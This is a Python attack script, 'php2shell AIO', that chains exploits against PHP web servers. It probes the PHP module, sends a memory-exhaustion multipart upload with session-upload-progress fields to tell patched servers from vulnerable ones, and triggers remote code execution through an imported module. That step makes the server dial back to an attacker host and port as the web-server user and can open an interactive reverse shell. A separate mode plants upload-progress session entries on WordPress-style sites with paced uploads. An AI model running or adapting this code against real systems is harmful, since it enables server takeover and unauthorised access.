#!/usr/bin/env python3
"""php2shell AIO — one command, pre- or post-patch, stock config.

Cells, in order (each also selectable individually):
  probe  GET php2shell_probe.php  -> the attacked module reports PHP_VERSION|sapi|memory_limit
  arm    vendor-shape OOM arm (PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS as the
         first two multipart parts + N padded file parts) against cve2_app.php.
         The vendor's own regression-test discriminator:
           visible "Allowed memory" fatal  -> POST-PATCH behavior (fix-era deferred OOM)
           silent 500 / connection crash   -> PRE-PATCH behavior (bailout era)
  rce    stock pubstate lever, run_once from stock_rce.py, N tries -> PUBSTATE=1
         + www-data banner (the lever RCE that survives the patch)
  shell  passthrough: stock_rce.py default pty shell (drops you in, blocks)

Requirements venue-side (stock config, no ini beyond the arm's five knobs the
vendor's own phpt pins — memory_limit cap, post_max_size, max_input_vars,
max_file_uploads, max_multipart_body_parts=-1): app.php, cve2_app.php,
php2shell_probe.php in the docroot. Attacker side: python3 stdlib only,
inbound rport/rport+1 for the dial-backs.

Examples:
  php2shell.py 192.168.51.170:18991            # probe+arm+rce, verdict
  php2shell.py 192.168.51.170:18991 --shell    # interactive www-data pty shell
  php2shell.py 192.168.51.170:18990 --arm      # discriminator only
"""
import argparse, os, socket, sys, time, urllib.request, urllib.error
import urllib.parse as _up

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import stock_rce as sr

ARM_PARTS, ARM_PAD = 8000, 512

def arm_body(sid):
    B = b'--ARMBOUND\r\n'
    parts = [b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
             + sid.encode() + b'\r\n',
             b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\narmP1\r\n']
    for i in range(ARM_PARTS):
        parts.append(('Content-Disposition: form-data; name="f[]"; filename="p%d.bin"\r\n'
                      'Content-Type: application/octet-stream\r\n\r\n' % i).encode()
                     + b'A' * ARM_PAD + b'\r\n')
    return B + b''.join(parts) + b'--ARMBOUND--\r\n'

def cell_probe(host, port):
    try:
        with urllib.request.urlopen('http://%s:%d/php2shell_probe.php' % (host, port), timeout=10) as r:
            return r.read().decode(errors='replace').strip()
    except urllib.error.HTTPError as e:
        return {404: 'MISSING (deploy php2shell_probe.php)'}.get(e.code, 'HTTP %d' % e.code)
    except Exception as e:
        return 'ERR ' + type(e).__name__

def cell_arm(host, port, path, timeout=120):
    req = urllib.request.Request('http://%s:%d%s' % (host, port, path),
                                 data=arm_body('armA1'), method='POST',
                                 headers={'content-type': 'multipart/form-data; boundary=ARMBOUND'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            code, body = r.getcode(), r.read().decode(errors='replace')
    except urllib.error.HTTPError as e:
        code, body = e.code, e.read().decode(errors='replace')
    except (ConnectionError, http_reset) as e:
        return 'CRASH', 'connection reset/killed mid-arm (%s)' % type(e).__name__
    except Exception as e:
        return 'CRASH', 'connection died mid-arm (%s)' % type(e).__name__
    if 'Allowed memory' in body:
        return 'PATCHED', 'visible fatal in HTTP %d body (fix-era deferred OOM)' % code
    if code == 500:
        return 'VULNERABLE', 'silent 500, no fatal text (bailout era)'
    if not body.strip():
        return 'VULNERABLE', 'empty reply, no fatal text'
    return 'INERT', 'HTTP %d, arm did not fire — pin the 5 vendor knobs (memory_limit<=10M, body caps)' % code

http_reset = (ConnectionResetError, ConnectionAbortedError, ConnectionRefusedError, socket.timeout)

def cell_rce(host, port, rhost, rport, n):
    good = 0
    for i in range(n):
        r = sr.run_once(host, port, rhost, rport, 'id -un; echo php2shell-OK',
                        i, pubstate=True, shell=False)
        banner = ' / '.join((r.get('banner') or '').splitlines()) if r.get('banner') else ''
        print('[rce %d/%d] %s%s' % (i + 1, n, r['note'], ('  <- ' + banner) if banner else ''), flush=True)
        if r['ok'] and r['shell']:
            good += 1
    return good

# ---- WP probe mode -------------------------------------------------------
# WordPress (and any sinkless consumer app): the engine chain is proven to work
# natively; what an app must supply is (a) a session on the route and (b) code
# that acts on it. This cell measures which of those the target actually has,
# with the two reshapes the field demanded: progress-field name ambiguity
# (plant under every candidate name at once) and the min_freq=1s compiled
# default (paced upload so the window outlives the first tick).

WP_PROGRESS_NAMES = ("PHP_SESSION_UPLOAD_PROGRESS", "upload_progress", "uploadprogress")

def wp_progress_body(tag, name="PHP_SESSION_UPLOAD_PROGRESS", size=600000):
    B = b'--WPB\r\n'
    field = ('Content-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (name, tag)).encode()
    pre = (B + field + B
           + b'Content-Disposition: form-data; name="wpf[]"; filename="t.gif"\r\n'
             b'Content-Type: image/gif\r\n\r\n'
           + b'GIF89a' + bytes([1, 0, 1, 0, 128, 1, 0, 1, 2, 3, 1, 0]) + b';')
    return pre + b'B' * max(0, size - len(pre) - 20) + b'\r\n--WPB--\r\n'

def wp_paced_post(url, sid, body, chunk=60000, pause=0.25, timeout=90):
    """Socket-level POST, body chunked at ~240KB/s so the progress window
    stays open past PHP's 1s first tick. Returns (status, headers, body_head)."""
    u = _up.urlsplit(url)
    s = socket.create_connection((u.hostname, u.port or 80), timeout)
    path = u.path + (('?' + u.query) if u.query else '')
    cookie = ('Cookie: PHPSESSID=%s\r\n' % sid) if sid else ''
    s.sendall(('POST %s HTTP/1.1\r\nHost: %s\r\n'
               'Content-Type: multipart/form-data; boundary=WPB\r\n%s'
               'Content-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, u.hostname, cookie, len(body))).encode())
    off = 0
    while off < len(body):
        s.sendall(body[off:off + chunk])
        off += chunk
        time.sleep(pause)
    resp = b''
    while True:
        d = s.recv(65536)
        if not d:
            break
        resp += d
    s.close()
    parts = resp.split(b'\r\n\r\n', 1)
    head = parts[0]
    rbody = parts[1] if len(parts) > 1 else b''
    lines = head.decode(errors='replace').split('\r\n')
    words = lines[0].split()
    status = int(words[1]) if len(words) > 1 else 0
    H = {}
    for ln in lines[1:]:
        k, _, v = ln.partition(': ')
        H[k.lower()] = v
    return status, H, rbody.decode(errors='replace')[:160]

def cell_wp(host, port, base, ep_path=None):
    url = lambda p: 'http://%s:%d%s' % (host, port, p)
    print('[wp]  probe %s:%d base=%s' % (host, port, base), flush=True)
    out = {}
    # A. anonymous GET: does the app hand out a PHP session on its own?
    try:
        with urllib.request.urlopen(url(base), timeout=15) as r:
            h, code = r.headers, r.getcode()
    except urllib.error.HTTPError as e:
        h, code = e.headers, e.code
    out['core_session'] = any('PHPSESSID' in v for v in h.get_all('set-cookie', []))
    print('[wp A] anon GET %s: HTTP %d, PHPSESSID-issued=%s'
          % (base, code, 'yes (app sessionizes anon!)' if out['core_session'] else 'no'))
    # B+C. per candidate progress-name: paced plant under a fresh sid, then
    # same-sid GET. First name whose entry becomes visible wins (engine only
    # honors the name matching session.upload_progress.name; duplicates in one
    # body corrupt the saved entry, so one name per attempt).
    out['entry_seen'] = None
    out['progress_name'] = None
    st = 0
    ep = ep_path or base
    for name in WP_PROGRESS_NAMES:
        sid = 'uafwp%07x' % (int(time.time()) % 0xfffffff)
        tag = 'uaf%05d' % (int(time.time()) % 100000)
        try:
            st, H, _ = wp_paced_post(url(ep), sid, wp_progress_body(tag, name))
        except Exception as e:
            print('[wp B] plant (%s) failed: %s' % (name, type(e).__name__))
            continue
        try:
            req = urllib.request.Request(url(ep), headers={'Cookie': 'PHPSESSID=' + sid})
            with urllib.request.urlopen(req, timeout=15) as r:
                entry = r.headers.get('X-UAF')
        except urllib.error.HTTPError as e:
            entry = e.headers.get('X-UAF')
        print('[wp BC] name=%s plant HTTP %d -> same-sid GET X-UAF=%s'
              % (name, st, entry or 'none'), flush=True)
        if entry:
            out['entry_seen'], out['progress_name'] = entry, name
            break
    return out, st

def wp_verdict(out, st):
    line = []
    if out['core_session']:
        line.append('session: app sessionizes anon natively')
    else:
        line.append('session: none on anon surface (needs session glue)')
    if out['entry_seen']:
        line.append('progress entry visible to app (%s, field name %s) — engine chain native'
                    % (out['entry_seen'], out.get('progress_name')))
    elif st in (200, 201, 202, 302):
        line.append('entry not visible (cleanup=1 default, or no oracle header) — persisted oracle needs cleanup=0 + observer')
    else:
        line.append('plant endpoint not answering (HTTP %d) — point --wp-path at the real upload route' % st)
    line.append('RCE: sink not ours to install — needs an exec-capable upload plugin (site-side)')
    return ' · '.join(line)

def main():
    ap = argparse.ArgumentParser(description='PHP2Shell stock-config AIO')
    ap.add_argument('target', help='host[:port]')
    ap.add_argument('--rport', type=int, default=4455)
    ap.add_argument('--rhost', default=None)
    ap.add_argument('--n', type=int, default=3, help='rce cell tries (default 3)')
    ap.add_argument('--arm-path', default='/cve2_app.php')
    ap.add_argument('--probe', action='store_true')
    ap.add_argument('--arm', action='store_true')
    ap.add_argument('--rce', action='store_true')
    ap.add_argument('--shell', action='store_true', help='interactive pty shell (passthrough to stock_rce.py)')
    ap.add_argument('--no-arm', action='store_true', help='in --all mode: skip the behavioral arm')
    ap.add_argument('--wp', metavar='BASE', default=None,
                    help='consumer-app probe mode against a path base, e.g. /blog')
    ap.add_argument('--wp-path', default=None, help='upload endpoint path for --wp (default: BASE itself)')
    args = ap.parse_args()
    host, _, port = args.target.partition(':')
    port = int(port or 80)
    rhost = args.rhost or sr.local_ip()

    if args.wp:  # exclusive: WP-shaped census, no dial-back needed
        out, st = cell_wp(host, port, args.wp, args.wp_path)
        print('--' * 18)
        print('VERDICT: ' + wp_verdict(out, st))
        sys.exit(0)

    if args.shell:  # exclusive: drop into shell and exit
        os.execv(sys.executable, [sys.executable,
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'stock_rce.py'),
                    args.target, '--rport', str(args.rport)] +
                   (['--rhost', rhost] if args.rhost else []))

    solo = args.probe or args.arm or args.rce
    probe = arm = rce = True
    if solo:
        probe, arm, rce = args.probe, args.arm, args.rce
    if args.no_arm:
        arm = False

    print('php2shell AIO — target %s:%d' % (host, port))
    ver, arm_class = None, None
    if probe:
        ver = cell_probe(host, port)
        print('[probe] module=%s' % ver)
    if arm:
        arm_class, detail = cell_arm(host, port, args.arm_path)
        print('[arm]   %s — %s' % (arm_class, detail))
    good = cell_rce(host, port, rhost, args.rport, args.n) if rce else None
    if rce:
        print('[rce]   %d/%d pubstate lever RCE (dial-back as web-server user)' % (good, args.n))

    print('--' * 18)
    if probe or arm or rce:
        line = []
        if ver and ver not in (None,) and 'MISSING' not in ver and not ver.startswith('ERR'):
            line.append('module %s' % ver.split('|')[0])
        if arm_class == 'PATCHED':
            line.append('arm shows visible-fatal: POST-PATCH behavior (fix era)')
        elif arm_class == 'VULNERABLE':
            line.append('arm shows silent/crash: PRE-PATCH behavior (bailout era)')
        if good is not None:
            line.append('lever RCE %s on this line' % ('CONFIRMED %d/%d' % (good, args.n) if good == args.n
                        else ('partial %d/%d' % (good, args.n) if good else 'FAILED %d/%d' % (good, args.n))))
        print('VERDICT: ' + ' · '.join(line) if line else 'VERDICT: inconclusive — see cell output')
    sys.exit(0 if (good in (None, args.n)) and (arm_class in (None, 'PATCHED', 'VULNERABLE')) else 1)

if __name__ == '__main__':
    main()
